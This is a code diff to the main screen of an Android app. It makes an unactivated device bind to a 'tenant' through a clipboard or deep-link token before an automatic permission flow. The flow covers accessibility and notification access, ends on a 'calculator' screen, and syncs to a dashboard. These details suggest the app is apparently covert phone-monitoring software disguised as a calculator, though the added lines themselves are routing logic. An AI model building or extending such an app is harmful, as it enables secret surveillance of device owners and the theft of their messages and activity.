@@ -433,6 +433,20 @@ class MainActivity : AppCompatActivity() {
      */
 
     private fun maybeStartAutoPermissionFlow() {
+        // Bind first, then ask. The chain used to run before the device had a
+        // tenant, so a fresh install walked the user through every permission
+        // screen and only then discovered it had no device token - the device
+        // never appeared as "active" on the dashboard and the whole setup had
+        // to be repeated after activation. Routing to activation first makes
+        // the order: open -> bind to tenant -> permissions -> calculator.
+        if (!deviceState.isActivated) {
+            Log.i(TAG, "Device not bound to a tenant yet - routing to activation before setup")
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (!isFinishing && !isDestroyed) routeToActivation()
+            }, 700L)
+            return
+        }
+
         val missingRuntime = getMissingRuntimePermissions()
         val isA11y = isAccessibilityEnabled()
         val isNotif = isNotificationAccessGranted()
@@ -478,6 +492,23 @@ class MainActivity : AppCompatActivity() {
      * Automatic SYNC NOW triggered once as soon as Accessibility permission and Core permissions are granted.
 
      */
+
+    /**
+     * Sends an unbound device to the activation screen, which tries the
+     * dashboard deep link / clipboard token and otherwise offers manual entry.
+     */
+    private fun routeToActivation() {
+        try {
+            startActivity(
+                Intent(this, ActivationActivity::class.java).apply {
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                }
+            )
+            finish()
+        } catch (e: Exception) {
+            Log.w(TAG, "Could not open the activation screen", e)
+        }
+    }
 
     private fun triggerAutoSyncAfterAccessibility() {
 
